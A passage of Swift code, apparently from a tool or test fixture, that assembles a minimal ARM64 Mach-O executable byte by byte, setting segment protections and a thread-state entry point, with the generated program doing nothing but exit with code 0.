        // filesize = 0x4000
        seg[40] = 0x00; seg[41] = 0x40
        // maxprot = 5 (r-x)
        seg[48] = 0x05
        // initprot = 5 (r-x)
        seg[52] = 0x05
        bin.append(contentsOf: seg)
        
        // LC_UNIXTHREAD (entry point)
        var thr = [UInt8](repeating: 0, count: 280)
        thr[0] = 0x05  // cmd = LC_UNIXTHREAD
        thr[4] = 0x18; thr[5] = 0x01  // cmdsize = 280
        thr[8] = 0x06  // ARM_THREAD_STATE64
        thr[12] = 0x44 // count = 68 (uint32s)
        // PC (x32 in thread state) = 0x100000180
        thr[272] = 0x80; thr[273] = 0x01; thr[274] = 0x00; thr[275] = 0x00
        thr[276] = 0x01 // high byte of 0x100000180
        bin.append(contentsOf: thr)
        
        // Pad to entry point offset (0x180)
        while bin.count < 0x180 { bin.append(0) }
        
        // Code at 0x100000180: exit(0)
        // mov x0, #0        ; exit code = 0
        // mov x16, #1       ; syscall number = exit
        // svc #0x80         ; syscall
        bin.append(contentsOf: [
            0x00, 0x00, 0x80, 0xD2,  // mov x0, #0
            0x30, 0x00, 0x80, 0xD2,  // mov x16, #1
            0x01, 0x10, 0x00, 0xD4   // svc #0x80
        ])
        
        // Pad to page size
        while bin.count < 0x4000 { bin.append(0) }
        
        return bin
    }
}
